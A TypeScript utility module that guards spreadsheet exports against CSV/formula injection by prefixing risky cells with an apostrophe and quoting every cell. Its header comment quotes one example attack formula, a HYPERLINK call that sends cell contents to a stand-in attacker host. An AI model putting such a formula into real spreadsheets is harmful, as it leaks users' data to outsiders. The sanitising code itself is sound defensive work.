/**
 * Safe spreadsheet exports (pure, unit-tested).
 *
 * Text typed by outsiders (e.g. a name on the public admission form) ends up
 * in CSV/Excel exports. A cell starting with = + - @ (or a tab / carriage
 * return) is run as a formula by Excel and Sheets ("CSV/formula injection",
 * OWASP A03), e.g. =HYPERLINK("https://evil.example?"&A1,"Click"). Such cells
 * get a leading apostrophe, which spreadsheets show as plain text.
 */
const FORMULA_START = /^[=+\-@\t\r]/;

/** The value as text, made inert if a spreadsheet would treat it as a formula. */
export function neutralizeFormula(value: unknown): string {
  const s = value === null || value === undefined ? "" : String(value);
  return FORMULA_START.test(s) ? `'${s}` : s;
}

/** One quoted, formula-safe CSV cell. */
export function csvCell(value: unknown): string {
  return `"${neutralizeFormula(value).replace(/"/g, '""')}"`;
}

/** Rows → CSV text (every cell quoted and formula-safe). */
export function toCsv(rows: unknown[][]): string {
  return rows.map((row) => row.map(csvCell).join(",")).join("\n");
}

/** For spreadsheet libraries fed with objects: neutralise every string value. */
export function sanitizeRecords<T extends Record<string, unknown>>(rows: T[]): T[] {
  return rows.map(
    (row) => Object.fromEntries(Object.entries(row).map(([k, v]) => [k, typeof v === "string" ? neutralizeFormula(v) : v])) as T,
  );
}
